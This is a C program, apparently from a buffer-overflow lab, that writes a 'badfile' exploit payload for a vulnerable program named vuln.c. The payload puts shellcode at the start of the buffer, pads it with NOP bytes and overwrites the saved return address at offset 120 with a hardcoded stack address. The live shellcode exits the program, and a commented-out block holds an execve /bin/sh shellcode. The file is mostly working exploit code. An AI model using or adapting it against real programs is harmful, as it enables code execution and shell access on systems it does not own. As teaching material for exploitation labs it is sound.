#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

// unsigned char shellcode[] =
// "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
// "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
// "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05";

// NEW SHELLCODE: Exit (sys_exit, 0x3c) 8 bytes
unsigned char shellcode[] =
"\xb0\x3c\x48\x31\xff\x0f\x05"; // Only 7 bytes here, plus null terminator = 8

int main(void) {
    // vuln.c reads up to 120 bytes
    // 100 buff + 8 rbp + 8 rip + 1 null = 117 < file size
    const int FILE_SIZE = 129;
    // bits from beginning of buff to
    const int RIP_OFFSET = 120;
    // target address
    uint64_t target_addr = 0x7fffffffdac0ULL + 0;
    //target_addr += 30;

    unsigned char buffer[FILE_SIZE];

    memset(buffer, 0x90, sizeof(buffer));

    // minus the null term
    int shellcode_len = (int)sizeof(shellcode) - 1;
    memcpy(buffer, shellcode, shellcode_len);
    memcpy(buffer + RIP_OFFSET, &target_addr, sizeof(target_addr));


    //debug
    // printf("Byte at offset 104 in buffer: 0x%02x\n", buffer[104]);
    // printf("Shellcode byte 14 = 0x%02x\n", shellcode[14]);

    // printf("Shellcode bytes: ");
    // for (int i = 0; i < shellcode_len; i++) {
    //     printf("%02x ", shellcode[i]);
    // }
    // printf("\n");

    buffer[RIP_OFFSET + 8] = 0x00;

    // write badfile
    FILE *file = fopen("badfile", "wb");
    if (!file) {
        perror("fopen");
        return 1;
    }

    // how many chars written to file
    size_t written = fwrite(buffer, 1, FILE_SIZE, file);
    if (written != FILE_SIZE) {
        fprintf(stderr, "Short write: wrote %zu bytes\n", written);
        fclose(file);
        return 1;
    }

    fclose(file);
    printf("Generated badfile (%d bytes)\n", FILE_SIZE);
    printf("RIP Addr: 0x%lx (Offset 120)\n", target_addr);
    printf("Shellcode starts at Offset 0 (0x%lx)\n", target_addr);
    printf("NOPs start at Offset %d\n", shellcode_len);
    return 0;

}
